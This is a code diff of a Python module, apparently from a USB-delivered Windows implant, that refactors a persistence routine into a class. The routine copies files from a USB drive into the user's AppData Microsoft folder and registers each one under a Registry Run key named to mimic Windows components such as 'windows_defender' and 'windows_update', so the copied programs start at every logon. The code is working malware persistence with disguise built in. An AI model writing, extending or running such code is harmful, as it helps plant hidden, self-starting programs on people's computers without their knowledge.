@@ -7,37 +7,57 @@ import subprocess
 import shutil
 import string
 import random
+from winreg import ConnectRegistry, OpenKey
+
+from core.splendenteError import Error, ERROR_FILE_NOT_FOUND, ERROR_FILE_EMPTY, EXIT_SUCCESS
 
 #--------------------------------------------------- [Function(s)/Class] ----------------------------------------------------#
 
-def Persistence(agentUsbDirectory):
-    targetDirPath = os.environ["APPDATA"] + "\\Microsoft"
-    targetRegisterPath = "REG ADD HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
-    targetRegisterVersion = [" /v windows update", "/v windows tasks", "/v windows system", "/v windows defender"] 
-    targetRegisterType = " /t REG_SZ"
+class Persistence:
 
-    if not os.listdir(agentUsbDirectory):
-        return 1
-    else:
-        for files in os.listdir(agentUsbDirectory):
-            if files != "yourFile.exe"
-                if os.path.isfile(targetDirPath + "\\" + files) == False:
-                    shutil.copy(agentUsbDirectory + "\\" + files, targetDirPath)
+    def __init__(self):
+        self.targetDirPath          = os.environ["APPDATA"] + "\\Microsoft"
+        self.targetRegisterPath     = "REG ADD HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
+        self.targetRegisterVersion  = [
+                                        " /v windows_update", 
+                                        " /v windows_tasks", 
+                                        " /v windows_system", 
+                                        " /v windows_defender",
+                                        " /v windows_scheduler",
+                                        " /v windows_network",
+                                        " /v windows_scanning"
+                                        ] 
+        self.targetRegisterType         = " /t REG_SZ"
+        self.RegisterVersionALreadyUsed = []
 
-                    if os.path.exists(targetDirPath + "\\" + files) == True:    
-                        if os.path.getsize(targetDirPath + "\\" + files) > 0:
-                            targetFile = " /d " + targetDirPath + "\\{0}".format(files)
-                            targetRegisterVersion = "{0}".format(random.choice(targetRegisterVersion))
-                            try:
-                                subprocess.run(targetRegisterPath + targetRegisterVersion + targetRegisterType + targetFile, shell=True, timeout=3)          
-                            except Exception as e:
-                                return 1
-                                pass
+    def Registry(self, agentUsbDirectory):
+        if not os.listdir(agentUsbDirectory):
+            return ERROR_FILE_NOT_FOUND
+        else:
+            for files in os.listdir(agentUsbDirectory):
+                if files != "yourFile.exe":
+                    if os.path.isfile(self.targetDirPath + "\\" + files) == False:
+                        shutil.copy(agentUsbDirectory + "\\" + files, self.targetDirPath)
+
+                        if os.path.exists(self.targetDirPath + "\\" + files) == True:   
+                            if os.path.getsize(self.targetDirPath + "\\" + files) > 0:
+                                targetFile = " /d " + self.targetDirPath + "\\{0}".format(files)
+                                targetRegisterVersion = "{0}".format(random.choice(self.targetRegisterVersion))
+
+                                self.RegisterVersionALreadyUsed.append(targetRegisterVersion)
+
+                                for version in self.RegisterVersionALreadyUsed:
+                                    if version == targetRegisterVersion:
+                                        while version == targetRegisterVersion:
+                                            targetRegisterVersion = "{0}".format(random.choice(self.targetRegisterVersion))
+                                            if version != targetRegisterVersion:
+                                                break
+
+                                subprocess.run(self.targetRegisterPath + targetRegisterVersion + self.targetRegisterType + targetFile, shell=True, timeout=3)
+                 
+                            else:
+                                return ERROR_FILE_EMPTY
                         else:
-                            return 1
-                    else:
-                        continue        
-                else:
-                    continue
-            else:
-                continue
+                            return ERROR_FILE_NOT_FOUND    
+                            
+            return EXIT_SUCCESS
